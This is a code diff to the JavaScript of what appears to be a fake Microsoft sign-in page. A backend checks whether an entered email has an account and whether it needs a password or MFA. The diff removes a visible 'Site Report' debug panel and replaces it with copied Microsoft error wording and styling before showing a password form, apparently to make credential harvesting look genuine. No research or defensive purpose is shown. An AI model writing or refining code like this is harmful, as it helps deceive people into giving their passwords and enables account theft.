@@ -575,9 +575,7 @@
                     } else {
                         // Show site report if available
                         if (data.siteReport) {
-                            let reportHtml = `🔄 ${data.message}<br><br>`;
-
-                            // Check for error messages first - if there are errors, don't proceed to password
+                            // Check for error messages first - if there are errors, only show the error
                             if (data.siteReport.errorMessages.length > 0) {
                                 // Get the first error message and format it like Microsoft does
                                 const firstError = data.siteReport.errorMessages[0];
@@ -586,36 +584,19 @@
                                     '<a href="#" onclick="return false;" style="color: #0067b8; text-decoration: none;">get a new Microsoft account</a>'
                                 );
                                 
-                                // Don't proceed to password form if there are errors
+                                // Only show the Microsoft error message, nothing else
                                 showMessage(formattedError, 'error');
                             } else if (data.siteReport.accountExists && data.siteReport.needsPassword) {
-                                reportHtml += '✅ Account found! Please enter your password.<br>';
+                                // Account found, show password form
                                 showPasswordForm(email);
-                                showMessage(reportHtml, 'success');
+                                showMessage('✅ Account found! Please enter your password.', 'success');
+                            } else if (!data.siteReport.accountExists) {
+                                // Account not found - show the Microsoft error message
+                                showMessage("We couldn't find an account with that username. Try another, or <a href='#' onclick='return false;' style='color: #0067b8; text-decoration: none;'>get a new Microsoft account</a>.", 'error');
                             } else {
-                                reportHtml += '<strong>📋 Site Report:</strong><br>';
-
-                                if (data.siteReport.accountExists) {
-                                    reportHtml += '✅ Account exists<br>';
-                                }
-
-                                if (data.siteReport.needsPassword) {
-                                    reportHtml += '🔑 Password required<br>';
-                                    showPasswordForm(email);
-                                }
-
-                                if (data.siteReport.needsMFA) {
-                                    reportHtml += '📱 Multi-factor authentication required<br>';
-                                }
-
-                                if (data.siteReport.siteResponse) {
-                                    reportHtml += `💬 Site Response: ${data.siteReport.siteResponse}<br>`;
-                                }
-
-                                reportHtml += `🌐 Current URL: ${data.siteReport.pageUrl || 'N/A'}<br>`;
-                                reportHtml += `📄 Page Title: ${data.siteReport.pageTitle || 'N/A'}`;
-                                
-                                showMessage(reportHtml, 'info');
+                                // Other cases - proceed to password
+                                showPasswordForm(email);
+                                showMessage('Please enter your password.', 'info');
                             }
                         } else {
                             showMessage(`🔄 ${data.message}`, 'info');
